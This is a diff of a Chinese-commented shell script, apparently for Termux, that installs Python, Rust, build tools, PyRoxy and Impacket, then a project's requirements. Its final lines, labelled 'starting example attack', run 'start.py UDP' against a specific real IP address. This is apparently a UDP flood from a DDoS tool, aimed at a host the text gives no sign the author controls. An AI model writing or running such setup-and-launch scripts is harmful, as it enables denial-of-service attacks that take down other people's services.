@@ -10,9 +10,9 @@ fi
 echo "正在更新软件包列表..."
 pkg update -y
 
-# 安装必要的软件和 Rust 编译器
+# 安装必要的软件、编译器和 Rust
 echo "正在安装 Python、Clang、OpenSSL、Git 和 Rust..."
-pkg install python clang openssl git rust -y
+pkg install python clang openssl git rust build-essential binutils -y
 
 # 安装 OpenSSL 工具
 pkg install openssl-tool -y
@@ -41,11 +41,9 @@ pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple
 # 更新 pip 并安装依赖
 echo "正在更新 pip 并安装依赖包（通过清华镜像源）..."
 pip install --upgrade pip
-
-# 安装依赖：requests、urllib3、charset_normalizer、maturin 的二进制文件
 pip install --only-binary :all: requests urllib3 charset_normalizer maturin
 
-# 安装 PyRoxy 和 impacket 模块（从源代码编译）
+# 安装 PyRoxy 和 impacket 模块
 echo "正在安装 PyRoxy 和 Impacket 模块..."
 pip install git+https://github.com/MatrixTM/PyRoxy.git
 pip install git+https://github.com/SecureAuthCorp/impacket.git
@@ -59,11 +57,8 @@ cd 1
 echo "正在安装项目依赖..."
 pip install --only-binary :all: -r requirements.txt
 
-# 再次激活虚拟环境，以确保后续操作在虚拟环境中执行
-echo "重新激活虚拟环境..."
-source ../venv/bin/activate
-
-# 添加攻击测试用例
+# 保持虚拟环境激活
+echo "环境设置完成，现在你可以开始你的项目工作了。"
 echo "开始示例攻击..."
 python3 start.py UDP 166.88.95.146 10 10
 
